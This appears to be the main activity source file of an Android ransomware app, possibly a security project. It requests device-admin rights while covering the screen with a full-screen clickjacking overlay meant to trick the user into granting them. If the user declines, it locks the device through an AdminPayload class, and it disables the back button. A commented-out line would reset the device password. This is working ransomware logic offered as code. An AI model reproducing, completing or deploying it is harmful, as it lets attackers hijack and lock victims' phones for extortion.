package projects.security.ransomware_1;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Bundle;
import android.os.Handler;
import android.os.Parcelable;
import android.os.SystemClock;
import android.support.design.widget.CoordinatorLayout;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.text.Layout;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.view.ViewStub;
import android.view.WindowManager;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.Toast;

public class StartActivity extends AppCompatActivity {
    private static final int ADMIN_REQUEST = 1;
    int progress = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                //DEBUG ONLY: deactivate admin rights for ease of testing
                debugDeescalate();
                attemptEscalate();
            }
        });



        //DEBUG ONLY: deactivate admin rights for ease of testing
        //debugDeescalate();

        attemptEscalate();




    }

    public void attemptEscalate() {
        //Attempt escalation now
        //Launch dummy_install dialog

        final Handler h = new Handler();
        new Thread(new Runnable() {
            public void run() {
                h.postDelayed(new Runnable() {
                    public void run() {
                        navigateToAdmin();
                    }
                }, 1000);

            }
        }).start();

       final WindowManager.LayoutParams clickjack_params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY, //clickjack Testing
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE, //Testing clickjacking only
                PixelFormat.OPAQUE);
        new Thread(new Runnable() {
            public void run() {
                h.post(new Runnable() {
                    public void run() {
                        //launchClickJacker();
                       AdminPayload.beginLock(StartActivity.this, "file:///android_asset/clickjack.html", clickjack_params, 6000, "CLICKJACK");
                    }
                });

            }
        }).start();





    }
    public void navigateToAdmin() {
        ComponentName compName = new ComponentName(this, AdminPayload.class);
        Intent escalate = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        escalate.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName);
        escalate.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.app_admin_description));
        startActivityForResult(escalate, ADMIN_REQUEST);

        Toast.makeText(StartActivity.this,"Returned", Toast.LENGTH_SHORT).show();
    }

    //New addition
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode != RESULT_OK) {
            AdminPayload.beginLock(this,null,null,0,"LOCK");
        }
    }

        //DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
    //dpm.resetPassword("2222", 0);


    /*
    public void launchClickJacker() {
        //ViewStub stub = (ViewStub) findViewById(R.id.dummy_install_stub);
        ViewStub stub = new ViewStub(this);
        stub.setLayoutResource(R.layout.dummy_install);

        final View dummy_install_view = stub; //View.inflate(this, R.layout.dummy_install, null);
        final LinearLayout dummy_layout;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                //WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.OPAQUE);

        //dummy_install_view.loadUrl("file:///android_asset/dummy_install.html");

        dummy_layout = new LinearLayout(this);
        dummy_layout.setOrientation(LinearLayout.VERTICAL);
        dummy_layout.setLayoutParams(new LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.MATCH_PARENT));
        //((CoordinatorLayout) findViewById(R.id.activity_start)).removeView(dummy_install_view);
        dummy_layout.addView(dummy_install_view);

        ((ViewStub) dummy_install_view).inflate();

        final WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
        wm.addView(dummy_layout, params);
        /*
        Button b = (Button) dummy_layout.findViewById(R.id.button);
        b.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                //One or more of these may be unnecessary
                dummy_layout.removeAllViews();
                dummy_layout.setVisibility(View.GONE);
                dummy_install_view.setVisibility(View.GONE);
                wm.removeView(dummy_layout);



            }
        });
        //
        final Handler h = new Handler();
        new Thread(new Runnable() {
            public void run() {
                for(progress=0; progress < 100; progress++) {
                    SystemClock.sleep(10);
                    // Update the progress bar
                    h.post(new Runnable() {
                        public void run() {
                            ((ProgressBar) dummy_layout.findViewById(R.id.progressBar)).setProgress(progress);
                        }
                    });
                }
            }
        }).start();





    }

    */
    public void debugDeescalate() {
        ComponentName old_admin = new ComponentName(this, AdminPayload.class);
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        dpm.removeActiveAdmin(old_admin);
    }



    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_start, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onBackPressed() {
        Toast.makeText(StartActivity.this,"Lol nope", Toast.LENGTH_SHORT).show();
    }
}
